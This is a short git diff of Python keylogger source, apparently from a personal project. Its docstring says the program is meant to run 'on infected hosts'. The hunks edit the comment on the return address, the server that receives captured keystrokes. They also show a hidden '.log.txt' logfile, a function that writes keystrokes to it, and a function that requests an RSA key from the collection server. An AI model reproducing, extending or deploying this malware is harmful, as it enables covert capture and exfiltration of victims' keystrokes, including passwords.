@@ -16,8 +16,7 @@ Can be frozen using PyInstaller to run on infected hosts without python installa
 Written by mowemcfc (jcartermcfc@gmail.com) starting 12/06/2020
 """
 
-return_addr = ("192.168.0.14", 80) # This port may not always be open
-                                # TODO: check multiple ports? configure host for this too
+return_addr = ("192.168.0.14", 80) # configure this to match the IP your server will run on. port 80 is HTTP so will most likely be always open.
 logfile_name = ".log.txt"
 
 # dict of code:key pairs corresponding to keyboard entry codes found in /include/linux/input-event-codes.h
@@ -108,8 +107,10 @@ def write_to_logfile(typed):
         outf.write(typed)
         outf.close()
 
+    return
+
 """
-    TODO: COMMENT
+Requests RSA public key from server and returns it
 """
 def request_key(sock):
 
